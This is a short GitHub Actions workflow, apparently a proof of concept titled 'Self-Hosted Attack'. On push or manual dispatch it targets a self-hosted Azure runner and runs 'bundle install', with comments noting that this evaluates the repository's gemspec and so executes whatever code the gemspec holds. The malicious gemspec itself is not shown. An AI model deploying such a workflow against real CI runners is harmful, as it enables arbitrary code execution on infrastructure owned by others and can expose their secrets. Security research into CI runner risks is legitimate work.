name: Self-Hosted Attack
on:
  workflow_dispatch:
  push:

jobs:
  attack:
    runs-on: [self-hosted, azure]
    steps:
      - uses: actions/checkout@v4
          
      - name: Bundle Install (triggers gemspec execution)
        run: |
          # Use system Ruby
          which ruby
          ruby --version
          which bundle
          
          # Run bundle install - this will evaluate the gemspec!
          bundle install 2>&1 || true
          
          echo "Done"
